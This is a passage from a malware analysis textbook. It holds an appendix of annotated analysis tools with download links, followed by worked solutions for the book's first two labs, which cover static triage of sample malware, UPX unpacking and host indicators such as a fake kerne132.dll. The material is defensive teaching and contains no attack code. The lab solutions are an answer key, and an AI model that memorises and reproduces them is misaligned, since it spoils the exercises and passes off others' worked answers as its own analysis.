  prefs: []
  type: TYPE_NORMAL
- en: We find this plug-in particularly useful when trying to decipher difficult encoding
    routines. In some cases, you can even copy and paste the decompiler’s output and
    use it to write a decoding tool. Hex-Rays Decompiler is the best tool on the market
    for decompiling, but it’s not without its flaws. The Hex-Rays Decompiler is available
    for purchase from *http://www.hex-rays.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**468**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix B
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**IDA Pro**'
  prefs: []
  type: TYPE_NORMAL
- en: IDA Pro is the most widely used disassembler for malware analysis. We discuss
    IDA Pro extensively throughout the book, and Chapter 5 provides an in-depth introduction
    to the tool. We recommend the commercial version from *http://www.hex-rays.com/*.
    A freeware version is available from *http://www.hex-rays.com/products/ida/support/download_freeware.shtml*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Immunity Debugger**'
  prefs: []
  type: TYPE_NORMAL
- en: Immunity Debugger (ImmDbg) is a freely available user-mode debugger. It is derived
    from the OllyDbg 1.1 source code, as we discuss in Chapter 9, except that ImmDbg
    has cosmetically modified the OllyDbg GUI and added a fully functional Python
    interpreter with an API. In
  prefs: []
  type: TYPE_NORMAL
- en: “Scriptable Debugging” on page 200 and the Chapter 13 labs, we demonstrate how
    to use ImmDbg’s Python scripting ability. You can download ImmDbg from *http://www.immunityinc.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Import REConstructor**'
  prefs: []
  type: TYPE_NORMAL
- en: Import REConstructor (ImpREC) is a useful tool when you are manually unpacking
    a piece of malware. The import address table (IAT) is often damaged when you dump
    memory while unpacking, and you can use ImpREC to repair the table. You provide
    the malware running in memory and a dumped version on disk, and ImpREC does its
    best to repair the binary. You can download ImpREC for free from *http://tuts4you.com/*
  prefs: []
  type: TYPE_NORMAL
- en: '*download.php?view.415\.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**INetSim**'
  prefs: []
  type: TYPE_NORMAL
- en: INetSim is a Linux-based software suite for simulating common network services
    that we find useful for dynamic analysis. Be sure to install it on a Linux virtual
    machine, and set it up on the same virtual network as your malware analysis Windows
    VM. INetSim can emulate many popular services, such as a Microsoft Internet Information
    Services (IIS) web server, and can even listen on all ports for incoming connections.
    We discuss INetSim in Chapter 3\. You can download it for free from *http://www*
  prefs: []
  type: TYPE_NORMAL
- en: '*.inetsim.org/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**LordPE**'
  prefs: []
  type: TYPE_NORMAL
- en: LordPE is a free tool for dumping an executable from memory. It allows PE editing
    and can be used to repair a program you dumped from memory using another method.
    LordPE is most commonly used for unpacking malware. You can download it for free
    from *http://www.woodmann*
  prefs: []
  type: TYPE_NORMAL
- en: '*.com/collaborative/tools/index.php/LordPE.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Malcode Analyst Pack**'
  prefs: []
  type: TYPE_NORMAL
- en: The Malcode Analyst Pack contains a series of utilities, one of which installs
    useful Windows shell extensions for strings, an MD5 hash calculator, and a CHM
    decompile option. The CHM decompile option is handy when dealing with malicious
    Windows help files. Also included is FakeDNS, a useful tool for spoofing DNS responses
    to a user-specified Tools for Malware Analysis
  prefs: []
  type: TYPE_NORMAL
- en: '**469**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: address. While these utilities are no longer officially supported, you might
    still be able to download them from *http://labs.idefense.com/*
  prefs: []
  type: TYPE_NORMAL
- en: '*software/download/?downloadID=8\.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Memoryze**'
  prefs: []
  type: TYPE_NORMAL
- en: Memoryze is a free memory forensic tool that enables you to dump and analyze
    live memory. You can use Memoryze to acquire all of live memory or just individual
    processes, as well as to identify all modules loaded on a given system, including
    drivers and kernel-level executables. Memoryze also can detect rootkits and the
    hooks they install. If you choose to use Memoryze, be sure to download Audit Viewer,
    a tool for visualizing Memoryze’s output that makes the memory analysis process
    quicker and more intuitive. Audit Viewer includes a malware rating index to help
    you identify suspicious content in your memory dumps. You can download Memoryze
    and Audit Viewer for free from *http://www.mandiant.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Netcat**'
  prefs: []
  type: TYPE_NORMAL
- en: Netcat, known as the “TCP/IP Swiss Army knife,” can be used to monitor or start
    inbound and outbound connections. Netcat is most useful during dynamic analysis
    for listening on ports that you know the malware connects to, because Netcat prints
    all the data it receives to the screen via standard output. We cover Netcat usage
    for dynamic analysis in Chapter 3 and also talk about how attackers use it in
    Chapter 11\. Netcat is installed by default in Cygwin and on most Linux distributions.
    You can download the Windows version for free from *http://joncraton.org/media/*
  prefs: []
  type: TYPE_NORMAL
- en: '*files/nc111nt.zip.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**OfficeMalScanner**'
  prefs: []
  type: TYPE_NORMAL
- en: OfficeMalScanner is a free command-line tool for finding malicious code in Microsoft
    Office documents. It locates shellcode, embedded PE
  prefs: []
  type: TYPE_NORMAL
- en: files, and OLE streams in Excel, Word, and PowerPoint documents, and can decompress
    the newer format of Microsoft Office documents. We recommend running OfficeMalScanner
    with the scan and brute options on pre–Office 2007 documents and with the inflate
    option on post–
  prefs: []
  type: TYPE_NORMAL
- en: Office 2007 documents. You can download OfficeMalScanner from *http://www.reconstructer.org/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**OllyDbg**'
  prefs: []
  type: TYPE_NORMAL
- en: OllyDbg is one of the most widely used debuggers for malware analysis.
  prefs: []
  type: TYPE_NORMAL
- en: We discuss OllyDbg extensively throughout the book, and Chapter 9 provides an
    in-depth introduction to the tool. OllyDbg is a user-mode x86
  prefs: []
  type: TYPE_NORMAL
- en: debugger with a GUI. Several plug-ins are available for OllyDbg, such as OllyDump
    for use while unpacking (discussed in Chapter 18). You can download OllyDbg for
    free from *http://www.ollydbg.de/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**OSR Driver Loader**'
  prefs: []
  type: TYPE_NORMAL
- en: OSR Driver Loader is a freely available tool for loading a device driver into
    memory. It is a GUI-based tool used for easily loading and starting a driver without
    rebooting. This is useful when you are dynamically **470**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix B
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: analyzing a malicious device driver and don’t have the installer. We discuss
    the OSR Driver Loader tool in Chapter 10\. You can download it from *http://www.osronline.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**PDF Dissector**'
  prefs: []
  type: TYPE_NORMAL
- en: PDF Dissector is a commercial GUI-based PDF analysis tool that graphically parses
    PDF elements and automatically decompresses objects, making it easy to extract
    malicious JavaScript. The program includes a JavaScript deobfuscator and interpreter
    to help you understand and execute malicious scripts. PDF Dissector can also be
    used to identify known vulnerabilities. This tool is available for purchase from
    *http://*
  prefs: []
  type: TYPE_NORMAL
- en: '*www.zynamics.com/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**PDF Tools**'
  prefs: []
  type: TYPE_NORMAL
- en: 'PDF Tools is the classic tool kit for PDF analysis. The tool kit consists of
    two tools: *pdfid.py* and *pdf-parser.py*. *pdfid.py* scans a PDF for objects
    and tells you if it thinks a PDF contains JavaScript. Since most malicious PDFs
    use JavaScript, this information can help you quickly identify potentially risky
    PDFs. *pdf-parser.py* helps you examine the contents and important objects of
    a PDF file without rendering it. You can download the PDF'
  prefs: []
  type: TYPE_NORMAL
- en: tools for free from *http://blog.didierstevens.com/programs/pdf-tools/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**PE Explorer**'
  prefs: []
  type: TYPE_NORMAL
- en: PE Explorer is a useful tool for viewing the PE header, sections, and import/export
    tables. It is more powerful than PEview because it allows you to edit structures.
    PE Explorer contains static unpackers for UPX-, Upack-, and NsPack-compressed
    files. This unpacking feature is seamless and saves a lot of time. You simply
    load the packed binary into PE
  prefs: []
  type: TYPE_NORMAL
- en: Explorer, and it automatically unpacks the file. You can download a trial version
    or purchase the commercial version of PE Explorer from *http://*
  prefs: []
  type: TYPE_NORMAL
- en: '*www.heaventools.com/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**PEiD**'
  prefs: []
  type: TYPE_NORMAL
- en: PEiD is a free static analysis tool used for packer and compiler detection.
  prefs: []
  type: TYPE_NORMAL
- en: It includes more than 600 signatures for detecting packers, cryptors, and compilers
    in PE format files. PEiD also has plug-ins available for download, the most useful
    of which is Krypto ANALyzer (KANAL). KANAL
  prefs: []
  type: TYPE_NORMAL
- en: can be used to find common cryptographic algorithms in PE files and provides
    the ability to export the information to IDA Pro. We discuss PEiD in Chapters
    1, 13, and 18\. Although the PEiD project has been discontinued, you should still
    be able to download the tool from *http://*
  prefs: []
  type: TYPE_NORMAL
- en: '*www.peid.info/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**PEview**'
  prefs: []
  type: TYPE_NORMAL
- en: PEview is a freely available tool for viewing the PE file structure. You can
    view the PE header, individual sections, and the import/export tables.
  prefs: []
  type: TYPE_NORMAL
- en: We use PEview throughout the book and discuss it in Chapter 1\. You can download
    PEview from *http://www.magma.ca/~wjr/*.
  prefs: []
  type: TYPE_NORMAL
- en: Tools for Malware Analysis
  prefs: []
  type: TYPE_NORMAL
- en: '**471**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Process Explorer**'
  prefs: []
  type: TYPE_NORMAL
- en: Process Explorer is a powerful task manager that is used in dynamic analysis
    to provide insight into processes currently running on a system. Process Explorer
    can show you the DLLs for individual processes, handles, events, strings, and
    so on. We discuss Process Explorer in Chapter 3\. You can download Process Explorer
    as part of the Sysinternals Suite of tools from *http://www.sysinternals.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Process Hacker**'
  prefs: []
  type: TYPE_NORMAL
- en: Process Hacker is a powerful task manager similar to Process Explorer, but with
    many added features. It can scan for strings and regular expressions in memory,
    inject or unload a DLL, load a driver, create or start a service, and so on. You
    can download Process Hacker from *http://*
  prefs: []
  type: TYPE_NORMAL
- en: '*processhacker.sourceforge.net/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Process Monitor**'
  prefs: []
  type: TYPE_NORMAL
- en: Process Monitor (procmon) is a dynamic analysis tool useful for viewing real-time
    filesystem, registry, and process activity. You can filter its output to remove
    the noise. We discuss Process Monitor in Chapter 3\. You can download Process
    Monitor as part of the Sysinternals Suite of tools from *http://www.sysinternals.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Python**'
  prefs: []
  type: TYPE_NORMAL
- en: The Python programming language allows you quickly code tasks when performing
    malware analysis. Throughout the book and labs, we use Python. As discussed in
    Chapters 5 and 9, IDA Pro and Immunity Debugger have built-in Python interpreters,
    allowing you to quickly automate tasks or change the interface. We recommend learning
    Python and installing it on your analysis machine. Download Python for free from
    *http://www.python.org/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Regshot**'
  prefs: []
  type: TYPE_NORMAL
- en: Regshot is a dynamic analysis tool that allows you to take and compare two registry
    snapshots. To use it, you simply take a snapshot of the registry, run the malware,
    wait for it to finish making any system changes, take the second snapshot, and
    then compare the two. Regshot can also be used for taking and comparing two snapshots
    of any filesystem directory you specify. You can download Regshot for free from
    *http://sourceforge*
  prefs: []
  type: TYPE_NORMAL
- en: '*.net/projects/regshot/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Resource Hacker**'
  prefs: []
  type: TYPE_NORMAL
- en: Resource Hacker is a useful static analysis utility for viewing, renaming, modifying,
    adding, deleting, and extracting resources for PE-formatted binaries. The tool
    works with both x86 and x64 architectures. Because malware often extracts more
    malware, a DLL, or a driver from its resource section at runtime, we find this
    tool useful for extracting those sections easily without running the malware.
    We discuss Resource Hacker in Chapter 1 and the Chapter 12 labs. You can download
    Resource Hacker from *http://www.angusj.com/resourcehacker/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**472**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix B
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Sandboxes**'
  prefs: []
  type: TYPE_NORMAL
- en: In Chapter 3, we discuss the pluses and minuses of using sandboxes.
  prefs: []
  type: TYPE_NORMAL
- en: Many sandboxes are publicly available, and you can also write your own.
  prefs: []
  type: TYPE_NORMAL
- en: Public sandboxes are a decent choice because they are always being developed
    in an effort to stay on top of the market. We demonstrate GFI Sandbox in Chapter
    3, but there are many others, including Joe Sandbox, BitBlaze, Comodo, ThreatExpert,
    Anubis, Norman, Cuckoo, Zero Wine, Buster Sandbox, and Minibis. As with hex editors,
    everyone has a preference, so try a few to see what works for you.
  prefs: []
  type: TYPE_NORMAL
- en: '**Sandboxie and Buster Sandbox Analyzer**'
  prefs: []
  type: TYPE_NORMAL
- en: Sandboxie is a program that runs programs in an isolated environment to prevent
    them from making permanent changes to your system. Sandboxie was designed to allow
    secure web browsing, but its sandbox aspect makes it useful for malware analysis.
    For example, you can use it to capture filesystem and registry accesses of the
    program you are sandboxing.
  prefs: []
  type: TYPE_NORMAL
- en: Buster Sandbox Analyzer (BSA) can be used with Sandboxie to provide automated
    analysis and reporting. Sandboxie and BSA can be downloaded from *http://www.sandboxie.com/*
    and *http://bsa.isoftware.nl/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Snort**'
  prefs: []
  type: TYPE_NORMAL
- en: Snort is the most popular open source network intrusion detection system (IDS).
    We discuss writing network-based signatures for Snort in Chapter 14\. Snort can
    be run actively or offline against packet captures.
  prefs: []
  type: TYPE_NORMAL
- en: If you write network signatures for malware, using Snort to test them is a good
    place to start. You can download Snort from *http://www.snort.org/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Strings**'
  prefs: []
  type: TYPE_NORMAL
- en: Strings is a useful static analysis tool for examining ASCII and Unicode strings
    in binary data. Using Strings is often a quick way to get a high-level overview
    of malware capability, but the program’s usefulness can be thwarted by packing
    and string obfuscation. We discuss Strings in Chapter 1\. You can download Strings
    as part of the Sysinternals Suite of tools from *http://www.sysinternals.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**TCPView**'
  prefs: []
  type: TYPE_NORMAL
- en: TCPView is a tool for graphically displaying detailed listings of all TCP
  prefs: []
  type: TYPE_NORMAL
- en: and UDP endpoints on your system. This tool is useful in malware analysis because
    it allows you to see which process owns a given endpoint.
  prefs: []
  type: TYPE_NORMAL
- en: TCPView can help you track down a process name when your analysis machine connects
    over a port and you have no idea which process is responsible (as often happens
    with process injection, as discussed in Chapter 12). You can download TCPView
    as part of the Sysinternals Suite of tools from *http://www.sysinternals.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**The Sleuth Kit**'
  prefs: []
  type: TYPE_NORMAL
- en: The Sleuth Kit (TSK) is a C library and set of command-line tools for forensic
    analysis that can be used to find alternate data streams and files hidden by rootkits.
    TSK does not rely on the Windows API to process NTFS and FAT filesystems. You
    can run TSK on Linux or using Cygwin in Windows. You can download TSK for free
    from *http://www.sleuthkit.org/*.
  prefs: []
  type: TYPE_NORMAL
- en: Tools for Malware Analysis
  prefs: []
  type: TYPE_NORMAL
- en: '**473**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Tor**'
  prefs: []
  type: TYPE_NORMAL
- en: Tor is a freely available onion routing network, allowing you to browse anonymously
    over the Internet. We recommend using Tor whenever conducting research during
    analysis, such as checking IP addresses, performing Internet searches, accessing
    domains, or looking for any information you might not want exposed. We don’t generally
    recommend letting malware connect over a network, but if you do, you should use
    a technology like Tor. After you install Tor, and before you start browsing, visit
    a site like *http://whatismyipaddress.com/* to confirm that the IP returned by
    the website is not your IP address. Tor can be downloaded for free from *https://www.torproject.org/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Truman**'
  prefs: []
  type: TYPE_NORMAL
- en: Truman is a tool for creating a safe environment without using virtual machines.
    It consists of a Linux server and a client machine running Windows. Like INetSim,
    Truman emulates the Internet, but it also provides functionality to easily grab
    memory from the Windows machine and reimage it quickly. Truman comes with scripts
    to emulate services and perform analysis on Linux. Even though this tool is no
    longer in development, it can help you understand how to set up your own bare-metal
    environment. You can download Truman for free from *http://*
  prefs: []
  type: TYPE_NORMAL
- en: '*www.secureworks.com/research/tools/truman/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**WinDbg**'
  prefs: []
  type: TYPE_NORMAL
- en: WinDbg is the most popular all-around debugger, distributed freely by Microsoft.
    You can use it to debug user-mode, kernel-mode, x86, and x64
  prefs: []
  type: TYPE_NORMAL
- en: malware. WinDbg lacks OllyDbg’s robust GUI, providing a command-line interface
    instead. In Chapter 10, we focus on the kernel-mode usage of WinDbg. Many malware
    analysts choose to use OllyDbg for user-mode debugging and WinDbg for kernel debugging.
    WinDbg can be downloaded independently or as part of the Windows SDK from *http://msdn*
  prefs: []
  type: TYPE_NORMAL
- en: '*.microsoft.com/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Wireshark**'
  prefs: []
  type: TYPE_NORMAL
- en: Wireshark is an open source network packet analyzer and useful tool for dynamic
    analysis. You can use it to capture network traffic generated by malware and to
    analyze many different protocols. Wireshark is the most popular freely available
    tool for packet capturing and has an easy-to-use GUI. We discuss Wireshark usage
    in Chapter 3\. You can download Wireshark from *http://www.wireshark.org/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**UPX**'
  prefs: []
  type: TYPE_NORMAL
- en: Ultimate Packer for eXecutables (UPX) is the most popular packer used by malware
    authors. In Chapters 1 and 18, we discuss how to automatically and manually unpack
    malware that uses UPX. If you encounter this packer in the wild, try to unpack
    the malware with upx –d. You can download this packer from *http://upx.sourceforge.net/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**VERA**'
  prefs: []
  type: TYPE_NORMAL
- en: Visualizing Executables for Reversing and Analysis (VERA) is a tool for visualizing
    compiled executables for malware analysis. It uses the Ether **474**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix B
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: framework to generate visualizations based on dynamic trace data to help with
    analysis. VERA gives you a high-level overview of malware and can help with unpacking.
    It can also interface with IDA Pro to help you browse between the VERA graphs
    and IDA Pro disassembly. You can download VERA from *http://www.offensivecomputing.net/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**VirusTotal**'
  prefs: []
  type: TYPE_NORMAL
- en: VirusTotal is an online service that scans malware using many different antivirus
    programs. You can upload a file directly to VirusTotal, and it will check the
    file with more than 40 different antivirus engines. If you don’t want to upload
    your malware, you can also search the MD5 hash to see if VirusTotal has seen the
    sample before. We discuss VirusTotal at the start of Chapter 1 since it is often
    a useful first step during malware analysis. You can access VirusTotal at *http://www.virustotal.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**VMware Workstation**'
  prefs: []
  type: TYPE_NORMAL
- en: VMware Workstation is a popular desktop virtualization product. There are many
    alternatives to VMware, but we use it in this book due to its popularity. Chapter
    2 highlights many VMware features, such as virtual networking, snapshotting (which
    allows you to save the current state of a virtual machine), and cloning an existing
    virtual machine. You can purchase VMware Workstation from *http://www.vmware.com/*
    or download VMware Player (with limited functionality) for free from the same
    site.
  prefs: []
  type: TYPE_NORMAL
- en: '**Volatility Framework**'
  prefs: []
  type: TYPE_NORMAL
- en: The Volatility Framework is an open source collection of tools written in Python
    for analyzing live memory captures. This suite of tools is useful for malware
    analysis, as you can use it to extract injected DLLs, perform rootkit detection,
    find hidden processes, and so on. This tool suite has many users and contributors,
    so new capabilities are constantly being developed. You can download the latest
    version from *http://code.google*
  prefs: []
  type: TYPE_NORMAL
- en: '*.com/p/volatility/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**YARA**'
  prefs: []
  type: TYPE_NORMAL
- en: YARA is an open source project used to identify and classify malware samples
    that will allow you to create descriptions of malware families based on strings
    or any other binary patterns you find in them. These descriptions are called *rules*,
    and they consist of a set of strings and logic.
  prefs: []
  type: TYPE_NORMAL
- en: Rules are applied to binary data like files or memory in order to classify a
    sample. This tool is useful for creating your own custom antivirus-like software
    and signatures. You can download YARA for free from *http://*
  prefs: []
  type: TYPE_NORMAL
- en: '*code.google.com/p/yara-project/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Zero Wine**'
  prefs: []
  type: TYPE_NORMAL
- en: Zero Wine is an open source malware sandbox that is distributed as a virtual
    machine running Debian Linux. Malware samples are executed using Zero Wine to
    emulate the Windows API calls, and the calls are logged to report on malicious
    activity. Zero Wine can even catch and defeat certain anti-virtual machine, anti-debugging,
    and anti-emulation techniques. You can download Zero Wine from *http://zerowine.sourceforge.net/*.
  prefs: []
  type: TYPE_NORMAL
- en: Tools for Malware Analysis
  prefs: []
  type: TYPE_NORMAL
- en: '**475**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**1**'
  prefs: []
  type: TYPE_NORMAL
- en: '**S O L U T I O N S T O L A B S**'
  prefs: []
  type: TYPE_NORMAL
- en: This appendix contains solutions to the labs that
  prefs: []
  type: TYPE_NORMAL
- en: appear at the ends of most chapters. For each lab, we
  prefs: []
  type: TYPE_NORMAL
- en: provide a short answer section followed by detailed
  prefs: []
  type: TYPE_NORMAL
- en: analysis. The short answer section is useful for quickly checking to see if
    you got the right answer. The detailed analysis is useful for following step-by-step
    exactly how to complete the lab. If you have trouble completing a lab, use the
    detailed analysis section to guide you through it.
  prefs: []
  type: TYPE_NORMAL
- en: The labs are designed to run on a Windows XP machine with administrative privileges.
    Many of the labs will work on Windows Vista or Windows 7, but some will not.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 1-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: These files were written specifically for this book, so as of this writing,
    you should not find a signature for them on *VirusTotal.com*. Of course, if these
    files become part of the antivirus signatures as a result of the publication of
    this book, the results will be different.
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Both files were compiled on December 19, 2010, within 1 minute of each other.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: There are no indications that either file is packed or obfuscated.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The interesting imports from *Lab01-01.exe* are FindFirstFile, FindNextFile,
    and CopyFile. These imports tell us that the program searches the filesystem and
    copies files. The most interesting imports from *Lab01-01.dll* are CreateProcess
    and Sleep. We also see that this file imports functions from *WS2_32.dll*, which
    provides network functionality.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: Examine *C:\Windows\System32\kerne132.dll* for additional malicious activity.
    Note that the file *kerne**1**32.dll*, with the number *1* instead of the letter
    *l*, is meant to look like the system file *kerne**l**32.dll*. This file can be
    used as a host indicator to search for the malware.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The *.dll* file contains a reference to local IP address 127.26.152.13\. This
    address is an artifact of this program having been created for educational and
    not malicious purposes. If this was real malware, the IP address should be routable,
    and it would be a good network-based indicator for use in identifying this malware.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: The *.dll* file is probably a backdoor. The *.exe* file is used to install or
    run the DLL.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: To answer the first question, we upload the file to *VirusTotal.com*, which
    performs a scan against antivirus signatures.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we open the files in PEview. For each file, we navigate to the **IMAGE_NT_HEADERS****IMAGE_FILE_HEADER****Time
    Date Stamp** field, which tells us the compile time. Both files were compiled
    on December 19, 2010, within 1 minute of each other. This confirms our suspicions
    that these files are part of the same package. In fact, a compile time that close
    strongly suggests that these files were created at the same time by the same author.
  prefs: []
  type: TYPE_NORMAL
- en: We know that the files are related because of the compile times and where they
    were found. It’s likely that the *.exe* will use or install the *.dll*, because
    DLLs cannot run on their own.
  prefs: []
  type: TYPE_NORMAL
- en: Then we check to see if either file is packed. Both files have small but reasonable
    numbers of imports and well-formed sections with appropriate sizes. PEiD labels
    this as unpacked code compiled with Microsoft Visual C++, which tells us that
    these files are not packed. The fact that the files have few imports tells us
    that they are likely small programs. Notice that the DLL
  prefs: []
  type: TYPE_NORMAL
- en: file has no exports, which is abnormal, but not indicative of the file being
    packed. (You will learn more about this export section when we return to these
    files in Lab 7-3.)
  prefs: []
  type: TYPE_NORMAL
- en: Next, we look at the files’ imports and strings beginning with the *.exe*. All
    of the imports from *msvcrt.dll* are functions that are included in nearly every
    executable as part of the wrapper code added by the compiler.
  prefs: []
  type: TYPE_NORMAL
- en: When we look at the imports from *kernel32.dll*, we see functions for opening
    and manipulating files, as well as the functions FindFirstFile and FindNextFile.
    These functions tell us that the malware searches through the **478**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: filesystem, and that it can open and modify files. We can’t be sure what the
    program is searching for, but the *.exe* string suggests that it is searching
    for **1**
  prefs: []
  type: TYPE_NORMAL
- en: executables on the victim’s system.
  prefs: []
  type: TYPE_NORMAL
- en: We also see the strings C:\Windows\System32\Kerne**l**32.dll and C:\windows\
    system32\kerne**1**32.dll. (Notice the change from the letter ***l*** to the number
    ***1***
  prefs: []
  type: TYPE_NORMAL
- en: in kernel32.dll.) The file *kerne**1**32.dll* is clearly meant to disguise itself
    as the Windows *kernel32.dll* file. The file *kerne**1**32.dll* can serve as a
    host-based indicator to locate infections, and it is one that we should analyze
    for malicious code.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we look at the imports and strings for *Lab01-01.dll*, which imports
    functions from *WS2_32.dll*. Because these functions are imported by ordinal,
    we don’t know which functions are being imported. We also see two interesting
    functions imported from *kernel32.dll*: CreateProcess and Sleep, which are commonly
    used as backdoors. These functions are particularly interesting to us in combination
    with the strings exec and sleep. The exec string is probably sent over the network
    to command the backdoor to run a program with CreateProcess. The sleep string
    is probably used to command the backdoor program to sleep. (This malware is complex.
    We’ll return to it in Lab 7-3, once we have covered the skills to analyze it fully.)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 1-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: As of this writing, the file matches 3 of 41 antivirus signatures.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: There are several indications that the program is packed with UPX. You can unpack
    it by downloading UPX and running upx –d.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: After unpacking the file, you’ll see that the most interesting imports are CreateService,
    InternetOpen, and InternetOpenURL.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: You should check infected machines for a service called Malservice and for network
    traffic to *http://www.malwareanalysisbook.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: When analyzing Lab 1-2, we upload the file to *VirusTotal.com* and see that
    it matches at least three virus signatures. One antivirus engine identifies it
    as a malicious downloader that downloads additional malware; the other two identify
    it as packed malware. This demonstrates the usefulness of *VirusTotal.com*.
  prefs: []
  type: TYPE_NORMAL
- en: Had we used only one antivirus program to scan this file, we would probably
    not get any information.
  prefs: []
  type: TYPE_NORMAL
- en: Upon opening the file with PEview, several indicators tell us that this file
    is packed. The most obvious indicators are sections named UPX0, UPX1, and UPX2—section
    names for UPX-packed malware. We could use PEiD to confirm the file’s packed nature,
    but it is not foolproof. Even if PEiD fails to identify the file as UPX-packed,
    notice the relatively small number of imports and that the first section, UPX0,
    has a virtual size of 0x4000 but a raw data size of 0\. UPX0 is the largest section,
    and it’s marked executable, so it’s probably where the original unpacked code
    belongs.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**479**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Having identified the program as packed, we can unpack it by downloading UPX
    from *http://upx.sourceforge.net/* and running the following command: upx -o newFilename
    -d originalFilename'
  prefs: []
  type: TYPE_NORMAL
- en: The -d option says decompress the file, and the -o option specifies the output
    filename.
  prefs: []
  type: TYPE_NORMAL
- en: After unpacking, we look at the imports sections and the strings. The imports
    from *kernel32.dll* and *msvcrt.dll* are imported by nearly every program, so
    they tell us little about this specific program. The imports from *wininet.dll*
    tell us that this code connects to the Internet (InternetOpen and InternetOpenURL),
